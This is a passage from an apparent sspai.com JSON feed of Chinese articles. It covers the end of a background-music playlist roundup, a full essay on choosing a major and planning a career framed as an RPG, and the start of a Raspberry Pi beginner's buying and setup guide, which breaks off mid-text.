Bandcamp</a>\n</li>\n</ul>\n<p>《兒童樂園》是一张融合了多种曲风的实验音乐专辑，也是我无论干吗都会拿来当 BGM 的万能专辑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/article/349fdf11cb21f26c752fdc51ea9f2992\"></figure><p>这张专辑是音乐大师 <a href=\"https://music.douban.com/musician/103850/\" target=\"_blank\">白水</a> 的作品，整体呈现轻快、活泼的风格，同时每首曲子都有自己独立的取向，部分乐曲还有配唱。白水在作品中大量使用了电子乐，但完全不是 EDM 式的「轰头电子」，相反，《兒童樂園》将电子、节奏和器乐结合得十分巧妙，还融入了民谣与山歌。虽然每首曲子用到的乐器和音乐元素很少，产生的变化却很丰富。</p>\n<p>听《兒童樂園》的感受就像进入了儿童乐园，整个人都闯入了一个单纯、干净的空间。《兒童樂園》也是我常用的工作背景乐，舒压效果极佳。</p>\n<h2>@Clyde：睡前必备 Bedtime Beats</h2>\n<ul>\n<li>平台：Apple Music</li>\n<li>歌单类型：平台推荐</li>\n</ul> <p>作为一名入睡困难户，睡前听歌一直以来都是我生活中雷打不动的一个习惯：打开播放器、选好歌单、设置好定时然后闭眼，随着音乐将自己没入无边黑夜……这个略带仪式感的流程走下来我的心一般也就静下来了。</p>\n<p>不过具体听什么这件事倒是经过了一番探索。</p>\n<p>和同事一样，最后选择 Apple Music 上的这份 Bedtime Beats 首先也是因为专辑封面。记得那是 Android 版 Apple Music 刚刚更新支持动态封面的时候，封面上缓缓转动的唱片、随晚风摇曳的绿植以及窗外时不时掠过的霓虹灯光，让人忍不住想象自己就是躺在画面中央那个闭眼深呼吸的人。</p>\n<p>至于内容，相比我以往尝试过的睡前歌单，Bedtime Beats 中收录的曲目以节奏舒缓、曲调柔和的器乐 hip-hop 为主，既不会像某些纯音乐那样深夜一个人听着觉得像恐怖片 BGM，也不会带来聒噪之感。部分曲目还能一拍一拍让你循声入梦，跟着声音在脑海中补全那个虚拟世界的每个细节，想着想着就睡着了……</p>\n<hr>\n<p>以上便是本期一派要与大家分享的全部内容。如果你也有特定场景下的「标配」歌单，也欢迎在本文评论区或 <a href=\"https://sspai.com/bullet/1625539421\" target=\"_blank\">一派</a> 页面聊聊你的 BGM。</p>\n<p><strong>扩展阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67055\" target=\"_blank\">FM3.14｜音乐最近听什么 EP01</a></li>\n<li><a href=\"https://sspai.com/post/67324\" target=\"_blank\">FM3.14｜音乐最近听什么 EP02：内卷之歌</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67569"},{"title":"从选专业开始，带你「玩」好职业规划这场大型 RPG","date":"2021-07-06 06:33:48","description":"\n<h2>为什么会有这篇文章</h2>\n<p>我们经常在求职网站上看到，有非常多的岗位把对应聘者的经验要求粗暴的分为「应届生」、「1-3 年」、「3-5 年」、「5-10 年」等，从求职的角度来说，入行 3 年可以说相当于是我们的第一个职业节点，从表面上看，这似乎只是一个工作时间的制约，没有达到的话会失去很多工作的准入机会，但其实背后还包含着「不需要调教、能独当一面」、「基础扎实」等默认的工作素质。</p>\n<p>回顾自己毕业以来这些年的职场经历，一方面幸运自己坚守了选择专业时的初心，做着相关的工作，也从实习起就选定了自己将来的职业方向，可以说在这条路上走得还算「顺利」，另一方面，作为一个日渐成熟的「打工人」，对于工作和职业规划，我有了很多新的认知，再回过头来审视自己的职业选择，只能说是做出了当时认知范围内的「最好选择」。</p>\n<p>这篇文章的存在，既是为了厘清自己在下一个阶段的职业规划，同时也希望我的经历和思路能对正在选择专业的朋友们有一些帮助，毕竟于普通人而言，选择专业大概率意味着选择未来要入行的职业领域，即使是以后也有一些修正的机会，比如说大学转专业、考研跨专业、工作转行......但这毕竟需要一定的成本，能尽力提供一个视角给选专业的小朋友，也算是这篇文章额外的价值。</p>\n<h2>挑选服务器，创建角色 🥷</h2>\n<p>职场生涯就好比是一场大型的 RPG 游戏，从选择服务器开始，这场游戏就正式启动了。</p>\n<h3>挑选服务器</h3>\n<p>每个人在挑选服务器时的诉求是不太一样的，有些人希望「网络通道不拥挤」，人少的新服自然是他的理想选择；而有些人更希望去火爆一点的服务器，能结识更多的大佬，运气好或许还有大号带躺，或者是想挑战强者。</p>\n<p>选专业也是一样的。火爆的服务器对应的是已经被验证过的、但竞争激烈的专业，而新服则是一些相对小众的、「少有人走的路」，两种选择各有利弊。</p>\n<p>已经被验证过、有明确的上升通道、行业内有非常多的翘楚，虽说就业选择多一点，但相对竞争激烈、出头很难。小众的领域内资料获取难、少有成熟前辈的经验、很多东西需要自己摸着石头过河，就业机会相对来说也较少一点，但也意味着更有想象力的发展空间，比如传说中「六代单传」的北大古生物学，可谓是冷门专业届的巨无霸，而当年因一个人的毕业照走红的薛逸凡修完了美国卡内基梅陇大学的计算生物学硕士课程后，被美国匹兹堡大学医学院的医学信息学博士专业录取，已经在带薪攻读博士学位，毕业前景良好。三百六十五行，行行出状元，外界的眼光和环境的起伏，从来都不是选择一个专业的决定因素。</p>\n<p>我的专业选择过程并没有太多坎坷，但太过草率地做好了选择，以至于用现在的视角看曾经，多少是有些后悔的。</p>\n<p>文理分班的时候，一方面，理智告诉我，以想要「考出更高成绩、读更好学校」为目的去选，文科是更优的选择（两边成绩差不多但功夫全用在理科上）；另一方面爸妈一直心心念念要我去学医学，而大部分医学专业只招收理科学生，我在两难之间拗不过家长，学了理科，从而在选专业的时候，犯下了两个错误:</p>\n<ul>\n<li>一是抱着「已经学了理科」的想法，为了那一丁点的<strong>沉没成本</strong>，放弃了一些我擅长又喜欢的方向，幼稚的我总觉得学了理科再去选文科也可以学的专业很亏；</li>\n<li>二是由于想从事互联网行业而选择了计算机专业，当时太过于<strong>偏颇地理解了专业与职业的关系</strong>。</li>\n</ul>\n<p>专业和职业之间的关系不能一概而论，还是要视情况而定，某些专业性很强的理工科，自学门槛较高，你极难通过毕业后转行的方式从事相关职业，像医生这种需要专业背书的职业更是可能性无限趋近于零；而毕业后想要做个普通程序员，门槛相对来说则低了很多。可惜的是毕业后，我才知道想要进入互联网行业有很多方式，想要从事「计算机相关的工作」也有非常多途径，况且即使在工作后，也拥有非常多「曲线救国」的机会，并不是只有选择计算机专业这一条道路，反而在很多时候，行业其实看重学历多过专业。</p>\n<h3>选专业的几个参考因素</h3>\n<h4>兴趣 / 天赋</h4>\n<p>明确自己的兴趣点和天赋所在，在选择专业时至关重要。拥有兴趣通常意味着你会有更多的热情去钻研，更容易坚持下去，而找到天赋所在则是容易获得更好的结果，获得成就感。比如从小就喜欢打辩论赛的学姐，在选择专业时很自然地读了法律；也有在语言上很有天赋的同学，报考专业的时候选的都是小语种，毕业后做起职业翻译，这种兴趣和专业匹配度较高的，职业选择上会少很多迷茫。</p>\n<p>经常听到「无脑选计算机」的言论，这种话并不负责任，不要因为什么热门就去学什么，我见过不少学得很痛苦却无法转专业的同学，因为行业过热而贸然选择了不适合自己的专业，甚至选择学校为专业让步，毕业后却做着不相关的工作，白白浪费大学四年。</p>\n<p>或许这个阶段，你还不是很明确自己的兴趣究竟跟怎样的专业关联，先不妨<strong>大胆设想一下自己理想的工作内容是怎样的</strong>，尽可能详尽地将其描述出来，然后去微博、豆瓣等社交平台去求助，说不定真的存在这样的职业，只不过你不知道而已。我就因为整天自己臆想、从没问过而错失机会👇🏿 （也是去年偶然和朋友聊起，才知道竟然真的有这样的工作），有见识的确很重要，没有也没关系，我们拥有广大有见识的网友们！</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/05/article/867b70d6be5ed687e70b4ba9abcc6e6e\"><figcaption>去年偶然和朋友聊起，才知道竟然真的有这样的工作</figcaption></figure><p><a href=\"https://xz.chsi.com.cn/recommend/index.action\" target=\"_blank\">这个网站</a> 提供的职业百科也可供参考，它罗列了职业职责、技能、所需的大学课程、工作环境、发展前景、薪酬等多项指标，但收录的职业不够全。</p>\n<h4>性格</h4>\n<p>性格对未来职业的选择影响也不小，比如对于内向型的人来说，面对需要经常和人打交道的工作会比较痛苦。关于性格与职业的匹配，有一些测试可以帮助你决断，最常见的就是 <a href=\"https://www.16personalities.com/\">MBTI 职业性格测试</a> 和霍兰德职业性格测试，每个性格有对应的职业库可以选择。</p>\n<p>虽然说有些东西是可以锻炼出来的，偶尔也会听到类似「性格内向的销售冠军」这样的故事，但那终究是少数，也需要努力地勉强自己，又不是什么非做不可的事业，没必要在这上面死磕。</p>\n<h4>前景</h4>\n<p>在选择专业时也要注意看下行业前景，尽量不要进入夕阳产业，我们每年都会看到有一些已经跟不上时代潮流的专业被取消，又有一些全新的专业在开设。以前总听说要「培养复合型人才」，在我的理解中，复合型人才体现在知识结构中，或许是多个学科知识的结合，对应在专业的选择上，一些<strong>交叉学科</strong>或许是一个思考方向，比如计算机辅助翻译这个专业，兼具语言和计算机的双重优势，可以去到 IT 公司的全球化部门或是语言产品的产品经理、技术传播等新兴岗位。</p>\n<p><strong>💡 </strong>提醒：报考志愿的时候给自己留一手，如果你没有很明确的兴趣点、也暂时没发现自己特别有天赋的地方，自己的性格又不过于极端，对将来想要从事的职业和行业还未曾有过想象，<strong>不妨看一下相对大众一点的专业</strong>，可以拿公务员或其他公职人员考试的岗位表来对照一下，有哪些专业是比较受欢迎的，省得将来被社会毒打、转头想考公务员的时候，却发现自己只能报考「三不限岗位」。</p>\n<p>总结我的选择，不管是文理科还是专业，我都没有遵循「喜欢且擅长」的第一原则。人生是由一连串选择塑造的，每一个选择都在为自己以后的生活砌路，但事实上回头看自己的选择，总是「被迫」在没那么恰好的路上一条道走到黑。</p>\n<h2>选择职业</h2>\n<p>选好了专业算是完成了创建角色这一步，接下来就要选择职业了。</p>\n<p>关于上班这件事，网上调侃的表情包层出不穷，它们无一不传达着当代社畜们「上班如上坟」的沉重心情，我也曾因为讨厌早会而无力起床去上班。可能你现在正做着自己喜欢的事，收入却很令人羞涩，也可能正拿着令人羡慕的薪水却做着令自己崩溃、需要忍受的工作，尽管大家职业各不相同，但是大部分人希望拥有一份能给自己带来金钱和快乐的工作，想要做自己喜欢的事情并且能得到丰厚回报。</p>\n<p>不过事实上，很多年轻人正深陷令人崩溃的工作又因为种种原因无法脱身，用忍受糟糕的现状来换取或许丰厚的报酬和或许充足的时间，眼下似乎就只有两种选择，要么安于现状，选择认命，安慰自己「这就是生活，这就是人生」，然后继续在现在的工作中煎熬，做着自己不喜欢的事情，试图把人生意义构筑在其他事情上或者干脆躺平；要么就破釜沉舟，努力去寻找到理想的工作，在工作中实现自我价值，获得快乐。</p>\n<h3>理想的职业应该是怎样的</h3>\n<p>理想的职业应该能让你无须在做喜欢的事情和谋生之间左右为难，它需要同时满足让你感受到快乐或带给你价值感、能带给你不错的薪水以及是你真正擅长的事情这几个要求。</p>\n<h4><strong>🥰 快乐</strong></h4>\n<p>「做你喜欢的事情」也许是老生常谈，但对于余生中每周至少要花 40 个小时面对的事情来说，我们需要的也不过如此。</p>\n<p>虽然没有人能永远都只做自己喜欢的事，即使是再喜欢的工作也免不了会做一些让人苦恼的行政内容如整理报告、做PPT等，但如果你没办法喜欢自己花大部分时间去做的事，就很难从工作中得到真正的快乐。</p>\n<h4><strong>💰 钱</strong></h4>\n<p>寻找理想工作的时候，钱不可能是次要因素。我们总是要生活的，得养家糊口，最理想的工作是能让我们衣食无忧，如果能实现财务自由，那就更好了。（多少有点白日做梦😶‍🌫️ ）</p>\n<p>钱虽然不是万能的，但如果整天因为收入微薄犯愁，我们也很难去热爱自己的生活。</p>\n<h4><strong>🤭 天赋（真正擅长的事情）</strong></h4>\n<p>读到这里，你可能会觉得我过多的放大了天赋的作用，但此天赋非彼天赋。在职场生活中，大多数时候我们能完全完成工作任务，能做到不错甚至相当不错，但是有些工作却可以轻而易举地出色完成，会受到其他人的侧目或者夸奖，或者有时候会在完成某项工作时达到心流状态，沉浸其中，丝毫不觉得辛苦。职场上所谓的天赋，不代表你一定得是像朗朗一样的钢琴家，才叫在音乐上有天赋，不代表你一定要在某个领域上特别出色，才叫有天赋，它是你与自身相较、而不是与他人相较的结果。</p>\n<p>理想工作就是这三个要素的<strong>完美组合</strong>：你有偿做着自己热爱的事情，并且每天都能感觉到工作带给自己的成就感和快乐。但这三个要素之间的比例对所有人来说都不一样，而且对同一个人来说也不是一成不变的，在人生的不同阶段，我们也会侧重不同的要素，明确自己想要的，可以结合一些测试，找到自己当前阶段最侧重的一些因子，找到这个组合属于自己的最佳路径。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/05/article/6082f9f11242ee79ad71f8c0f47d0b5e\"></figure><p>《商业模式新生代（个人篇）》这本书中给出的职业<strong>「蜜罐区」</strong>的概念，缺失了「钱」的因素，换成了性格要素，这无非在于你自己如何看待工作这回事，是把职业作为实现自我价值的手段，还是一种糊口的方式，或者是其他。</p>\n<p>我们的职业观和价值观往往是围绕着他人建立起来的，特别是在职业选择方面，来自家庭、同侪的压力会使得我们经常围绕「安全」、「稳定」、「高薪」等因素做出选择。钱通常会驱使我们做出不理智的判断，我们也或许为了钱在选择上做出妥协，但一定程度上，薪资也反映了这份工作对我们的认可程度，至于究竟它能占到多大的比例，还是要根据个人自身情况来了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/05/article/5f831aa69fa56d004b518d803986c6a6\"></figure><h3>如何找到理想的职业</h3>\n<h4><strong>审视自己</strong></h4>\n<p>每个人职场生活的打开方式大不相似，工作经验也会不尽相同，虽然你会在职场中收获很多，但更多时候比起在工作中发现自己想做的事，更快发现的可能是自己不想做什么。</p>\n<p>我们需要很好地审视自己，<strong>仔细识别并且盘点自己擅长的事情</strong>，在开始「乱点技能树」之前，先把自己现有的技能点列出来，借助测试和他人的评价帮助我们找到自己擅长或者合适的领域。</p>\n<p>然后再列出自己讨厌和不擅长的事情，了解自己的长处很重要，同时知道自己的短板也很重要。虽然我们最短的短板大概率永远不会变成长板，但可以对比自己已有技能点和合适领域，关注可以并且需要改进的事情。</p>\n<h4><strong>跳出思维定势，扩大选择范围</strong></h4>\n<p>要想找到自己的理想工作，就要跳出思维定势，需要尽可能的扩大选择范围，增加选项，而且它们不必看起来一定切实可行。我们的目标是找到最适合自己的工作，而不是千篇一律、人云亦云的工作建议。</p>\n<p>当列好所有能想到的选项时，接下来就可以<strong>排除</strong>了：</p>\n<ul>\n<li>首先，要排除那些不能让我们快乐的选项，生命很短暂，要浪费在喜欢的事情上。</li>\n<li>接下来，排除那些没有创收潜力的想法，可以把其作为爱好，但不能作为选定的职业跑道（没有经济压力或者对金钱不屑一顾的朋友们不在讨论范围内）。</li>\n<li>最后，排除那些自己不是特别擅长的事情。成功的路不止一条，但找到自己的理想工作不在于你能做什么，而在于你应该做什么。</li>\n</ul>\n<p>当然可能这个排除的过程极其艰难痛苦，也有人会如我一样想要通过大量实验得到答案，花费大量的时间和精力，尝试很多不同的想法，在寻找和尝试的过程中，逐渐排除、缩小选项，直到找到适合自己的答案，或者是给自己一段时间去调研，得到直接的反馈，打破幻想。</p>\n<p>我在三年半的时间中做了不少尝试，虽然已经选定了某个岗位，但是岗位细分的工作内容和方向是不同的，对能力需求侧重点也是不一样的，甚至是以后的职业规划路径都会略有偏差，网上的信息和他人的经验比起自己的体会总是差了很多，于是还是自己去体验了一下。这个过程成本还是偏高的，最好利用好自己的新手光环，尽量在实习阶段多尝试，找准方向，尽早入场。</p>\n<p>沃伦·巴菲特有一个<strong>「5 个人生目标」法</strong>可以参考：</p>\n<ol>\n<li>首先，列出你一生中想做的 25 件事。</li>\n<li>然后，从列表中圈出最想做的 5 件事。</li>\n<li>要慎重选择！放弃其余的 20 件事，只做和那 5 件事相关的工作。</li>\n</ol>\n<p>你可能会认为其余 20 件事依然重要，只是没有那 5 件重要。但是不要这样想，巴菲特的建议是尽快放弃未被圈中的事情。如果只选择 5 个人生目标，你就将集中更多精力去实现它们。</p>\n<h4><strong>既要不断尝试，也要学会放弃</strong></h4>\n<p>俗话说「男怕入错行」，很多人对进入错误的行业、做出错误的职业选择有一种根深蒂固的恐惧，但有时候这是难免的，可能你大学读几年才发现这个专业不适合你，可能你毕业出来找工作才发现自己的就业面极窄，也许你工作中无意接触到工作让你发掘了自己天赋所在......</p>\n<p>不管当初我们因为信息有限或是已经改变了初衷「入错了行」，要正视转行是很正常的一件事，很少有人的职业生涯像最初设想的那样一路顺风顺水的发展下去，我们也很难在 18 或者 22 岁的时候就知道接下来的 40 年职业生涯里真正要做什么、适合做什么，而在探索自己的理想工作时，<strong>不止要不断尝试，也要善于放弃，尽量忽略沉没成本，克服自己的错失恐惧症。</strong></p>\n<p>关于沉没成本，自觉我的前半生都在这一回事上反复地栽跟头，自己明明知道，却就是舍不得、不甘心，总是抱着「我已经xx」的心态来做选择，明明已经发现了自己最擅长最合适的事情，也挣扎了很久才开始行动，试试把心态转换成「及时止损」，已经「浪费」了很多时间在不擅长的事情，所以要快快终止。</p>\n<p>初入职场，可能有的人目标明确，一出校门就进入令自己满意的岗位，但大部分人不会知道自己想要什么，也不知道自己擅长做什么，这很正常。寻找理想工作很少一路坦途，放平心态，拉长战线，慢慢寻找，反正人生还很长。</p>\n<h3>如何得到理想工作</h3>\n<p>当你找到了自己的理想工作，下一步自然是想要得到它，但这需要先设立职业目标，做好职业规划，提升自己的技能，然后才能向着这份工作冲击！</p>\n<p>得到理想工作是技能、规划和运气的组合技，有技能和规划才有资格碰到好运气。</p>\n<h4><strong>设立职业目标，做好职业规划</strong></h4>\n<p>在开始职业规划前，首先要对两个数字有概念：</p>\n<ul>\n<li>⌛️ <strong>职业生涯的长度：</strong>用你想退休的年龄减去现在的年龄，比如我想 50 岁退休，那就还剩下 25 年多的职业生涯年限，很多人会认为职业生涯到 40 就差不多结束了（比如传说中职业寿命较短的程序员岗位），但其实大部分人都低估了职业生涯的长度，职业生涯就像一场马拉松，我们需要有规划、有准备，并且把握好节奏，掌握好每一个职业阶段的所作所为。</li>\n<li>⌛️<strong> 精通一项技能花费的时间：</strong>《异类》里说要达到某个领域佼佼者的水平，大概需要 1w 小时的训练。无论是什么样的天赋型选手，想要在自己的行业内有所成就，达到前 10% 或者 20% 的水平，都需要花费大量的时间进行刻意训练。对需要掌握的技能越精通，就越能为职业生涯做最佳决策，从而将你获得长期成功的可能性最大化。</li>\n</ul>\n<p>我们还可以借助这份<strong>「个人商业模式画布」</strong>的九个关键点去梳理自己的职场规划。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/05/article/456f7086b2ad656c8a9627897fea0945\"></figure><p>规划自己职业生涯就好比塑造一个品牌，把自己作为一个产品从 0 到 1 地去打磨、改进和更新，在这个层面上讲，的确「人人都是产品经理」。</p>\n<p>职业生涯可能大致分为三个阶段，每个阶段有不同的应对策略。</p>\n<h2>☝🏿 第一个阶段：进入新手村，打怪升级</h2>\n<p>第一个阶段是需要我们学习探索的阶段，过程可能充满尝试和错误，找到自己长板、确定好行业及职业方向、树立起良好的工作习惯，都是这个阶段要完成的事情。</p>\n<p>这阶段的唯一目标就是为接下来的两个阶段打好基础，对于产品经理来说，我们也总是听到「1-3 年是基础期，重点打好产品基本功」这样的话，在这个阶段，我们并不仅仅是被动地增长年龄和阅历，但也不一定必须要得到理想工作，而是要找出自己擅长什么、不擅长什么、喜欢做什么，以及不喜欢做什么。</p>\n<p>对于刚进新手村的职场新人，我有一些小 tips 仅供参考：</p>\n<ul>\n<li>🧐 <strong>如果你还在校，请利用这个职场前置黄金期做好准备。</strong>如果你不知道自己喜欢什么样的工作，或是你有几个喜欢的方向，比如互联网行业的产品经理、运营、设计岗你都还挺有兴趣的，那么一定要珍惜「实习期」这样低成本的试错机会，打下基础，为以后能做出成功的职业生涯决策积累信息。我就是在大学期间就确立了自己的理想工作，也有意识的在毕业前积累这个工作需要的基础技能，很幸运地在实习时就一直做了产品经理，履历看起来对这个职业很「坚定」。</li>\n<li>🧾 <strong>制订求职作战计划。</strong>你可以列出一份可能对你感兴趣的 10～20 家公司或者岗位的初始清单，记录下岗位的职能 / 技能要求，然后盘点自己的工作技能清单，梳理自己的技能和经验，评估自己的目前水平，绘制出提升路径。如果还在校，可以利用校园招聘资源等，尝试跟自己喜欢的工作沟通咨询，它可以让你更好的了解需要达到什么样水准才能获得一份工作，不一定靠这个认真来找工作，你可以把这个视为一次次的预演。</li>\n<li>👩🏿‍💻 <strong>创建一份来自未来的简历。</strong>不妨花时间想想希望自己几年后的简历看起来是什么样，创建一份「未来简历」，可以从你向往的领域大佬的履历里剪贴，也可以是从你理想工作的 Job Description 里摘抄，总之有一个憧憬想象中的未来可以督促自己采取行动，向着梦中的简历努力。</li>\n</ul>\n<h2>✌🏿 第二个阶段：聚焦主线任务，快速升级阶段</h2>\n<p>这个阶段可以说是整个职业生涯中最要紧最重要的时间，需要你聚焦主线任务、着眼于核心长板，突破自我。</p>\n<p>这个时候需要识别、拓展和投注自己的长板，在你的长板、你的爱好以及这个世界的需求之间寻找交集。想补足短板已经没有太大性价比，更好的办法是专注自己的长板，没有人能面面俱到，坦率地承认自己的短板，尽量针对其寻找能补足他们的队友，把大把时间放在发展自己的核心竞争力上是更划算的打算，为自己贴上标签，在职场上树立起自己的品牌，创造真正的差异。麦肯锡在人才档案中关注<strong>「尖峰点 spiking」</strong>，即大幅超过平均水平的技能和热情，我们需要找到自己与众不同的点并且花时间培养它，成为自己这个品牌的优势和记忆点。</p>\n<p>如果用互联网产品来做比喻，如果说第一个阶段是建立基础框架、做好基础功能的话，那么第二个阶段就是建立你产品护城河的时候。</p>\n<h2>👌🏿 第三个阶段：开疆拓土，世界排名赛阶段</h2>\n<p>一般来说会认为职业生涯的最后几年大势已去，没有太多的职业竞争力，是时候退位让贤。但坦率讲第三个阶段确实很考验人的规划力和思维高度，很多人或许坚持不到这个阶段就转行了，但也有许多人从执行或管理层转变成顾问、专家、老师的角色，比如很多程序员转行做职业教育的老师，很多产品经理辞职去创业。要想在第三阶段继续活跃，需要合理规划，不断地学习，保持和行业的联结，不断收集行业内前辈的经验，规划好自己的道路。</p>\n<h3><strong>提高专业技能</strong></h3>\n<p>跟工作直接相关的、专业领域的技能是自己一定要掌握的，并且不断提高的，这是我们在工作中安身立命之本，每一个领域需要掌握的技能都不一样，但想要精准地练习一项技能，从单点开始突破最容易成功。每个岗位的工作内容都不止一项，如果什么都想学，就很容易陷入「乱点技能树」的误区，很难在短时间内得到提高。</p>\n<p>更好也更有效率的做法是有针对性地练习一个技能更快达到行业内较高水准，然后就安心地挑战下一项技能，从单点开始突破容易很快看到效果，逐渐树立职业自信。</p>\n<h3><strong>训练可迁移「软技能」</strong></h3>\n<p>可迁移技能是指不论你是从一个工作换到另一个工作、从一家公司换到另一家公司、甚至从一个行业换到另一个行业时都能依靠的能力和基础，也就是放之四海皆可用的技能。</p>\n<p>比如写作能力，不是只有职业作家需要具备写作能力，大部分人在工作中都需要清晰表达的能力，写作本质上是梳理自己思路，表达自己的想法，让别人理解或者认可自己的观点。无论从事哪种工作，能够充满自信的提出有说服力、强有力的观点都非常关键；</p>\n<p>比如执行力，提出想法很容易，而能把想法付诸实践的执行力才是最重要的。训练这些受用一生的关键能力对我们职业生涯的发展有益无害。</p>\n<h3><strong>积累有意义的经验</strong></h3>\n<p>有意义的经验可能既可以让自己成为复合型人才，又给自己创造新的机会，还帮我克服掉「损失厌恶」的心理。比如我在游戏行业及 AI 领域积累的行业经验是在为我后来的工作蓄势，新的经验会让自己离开舒适圈，建立新的职业技能，拥有丰富的行业经验也侧面证明自己的适应性和灵活度。在职业道路上，走过的每一步都算数，你所有的经历，都可能以意想不到的方式运用在新的工作中。</p>\n<h2>结语</h2>\n<p>关于工作是什么，想必每一个职场人都有自己不同的答案，在三年多的尝试后，对于自己擅长什么、适合怎样的方向，我心里大致也有了答案。跟自己性格八字不合的职位，还是不要勉强了，是有人「天生就适合」什么样的工作，也的确有人天生就不适合，比如我天生就不适合做管理，每天接触太多的人让我非常心累。人生哲学是「学会放弃」和「快乐第一」的我，只想尽力找到自己适合、擅长并做得开心，能从其中得到快乐和成就感的工作。</p>\n<p>参考资料：<a href=\"https://open.163.com/newview/movie/courseintro?newurl=MFG8HTJ3K\">TED丨为什么有些人总是找不到命中注定的职业</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/67564"},{"title":"从选购到上手：树莓派零基础入坑指南","date":"2021-07-06 03:30:26","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/162\" target=\"_blank\">树莓派</a> 专栏，树莓派是一系列的微型电脑，搭载了开源的操作系统，配备多种拓展接口，具有极高可玩性。关注专栏，随时掌握最新资讯，了解更多实用教程，培养动手能力与折腾精神。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>树莓派是只有信用卡大小、可运行操作系统的计算机 <sup class=\"ss-footnote\" href=\"https://sspai.com/post/64602\" title=\" 除了 2021 年 1 月份发布的新品 Raspberry Pi Pico，它是一款单片机开发板。\" footnote-id=\"1\">1</sup>。第一款树莓派于 2012 年发售，至今已有 9 年。9 年间，大大小小、稀奇古怪的树莓派项目遍地开花：卫星制造公司 <a href=\"https://www.raspberrypi.org/blog/raspberry-pi-in-space/\" target=\"_blank\">将树莓派安装到人造卫星里 </a>，为卫星提供拍摄和图片传输功能；科技爱好者们使用树莓派搭建 <a href=\"https://opensource.com/article/17/3/building-personal-web-server-raspberry-pi-3\" target=\"_blank\">Web 服务器 </a>、<a href=\"https://shumeipai.nxez.com/2018/11/01/a-raspberry-pi-nas-that-really-look-like-a-nas.html\" target=\"_blank\">NAS</a>、<a href=\"https://shumeipai.nxez.com/2020/08/17/smartpet-smart-pet-feeder.html\" target=\"_blank\"> 智能家居 </a>；游戏玩家在树莓派的帮助下，<a href=\"https://www.yystv.cn/n/946781\" target=\"_blank\"> 让 1989 年的 GameBoy 实现了在线联机 </a>；科技博主使用树莓派采集并识别街景，制作了 <a href=\"https://www.yystv.cn/p/7792\" target=\"_blank\">一台向路过的狗狗发出赞美的机器 </a>。树莓派以其只有信用卡大小的尺寸、五脏俱全的软硬件功能以及两者结合带来的丰富可玩性而深受大家的喜爱，不断吸引着新的小伙伴入坑。本文便是一份面向准备入坑或者刚入坑树莓派的新人玩家的上手指南。</p>\n<p>都 2021 年了，还有必要写树莓派上手指南吗？ 一番调研之后，我认为答案是肯定的。虽然网络上已经有很多新手向的树莓派上手教程，我派作者 <a href=\"https://sspai.com/u/a99heyy3/updates\" target=\"_blank\">@ 梓姵君 </a>和 <a href=\"https://sspai.com/u/2l82dcjv/updates\" target=\"_blank\">@Sunbelife</a> 也分别在 2014 和 2017 年就发表了相关文章，但是，一方面，树莓派的软硬件更新活跃，一些上手教程的内容已经过时，需要更新和补充；另一方面，一些教程内容比较分散，对新手不够友好。因此，我希望在前辈们的基础上，整理一篇 2021 年最新的、浅显易懂的、比较全面的树莓派入坑指南，避免晦涩的术语和冗长的代码，力求让最没有基础的新人玩家只看这一篇文章，也可以顺利完成对树莓派的选购、配置和使用。</p>\n<p>我们开始吧。</p>\n<p>❗注：本文需要用到搭载 Windows 或 macOS 的电脑（下文称为 PC）。文中操作演示在搭载 Windows 的电脑上进行，但我会给出在搭载 macOS 的电脑上操作的方法。</p>\n<h2>购买树莓派和配件</h2>\n<p>截至 2021 年 6 月，树莓派基金会官网一共有 11 款树莓派产品 <a href=\"https://www.raspberrypi.org/products/\" target=\"_blank\">在售</a>。这 11 款产品中，有 1 款是今年 1 月份发布的 Raspberry Pi Pico，它是一款单片机开发板；其他 10 款产品都是可以运行操作系统的电脑。根据外观、配置和性能，这 10 款产品可以分为 3 个系列：</p>\n<ol>\n<li>Model B 系列：当家旗舰</li>\n<li>Model A 系列：外形较小，配置和接口略有阉割</li>\n<li>Zero 系列：拥有超小身材</li>\n</ol>\n<p>我制作了一张简化的产品介绍图，图片展示了各个系列各代产品的型号和外观参考照片，产品型号的颜色越深表示发布时间越晚、配置和性能越高；图中除了 Raspberry Pi 400 外，其它产品照片缩放比例相同，因此大家可以直观对比它们的外形大小差异。Raspberry Pi 400 是套了键盘「马甲」的 Raspberry Pi 4 Model B，两者配置相同。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/15/3060e23855b927fd73c99f533d37da74.jpg\"><figcaption>▲在售的 11 款树莓派产品，图中产品外观照片来自 <a href=\"https://www.raspberrypi.org/help/\" target=\"_blank\">Raspberry Pi Foundation</a>。</figcaption></figure><ul><li>📖 拓展阅读：<a href=\"https://shumeipai.nxez.com/\" target=\"_blank\"> 树莓派实验室 </a>整理并绘制了详细 <a 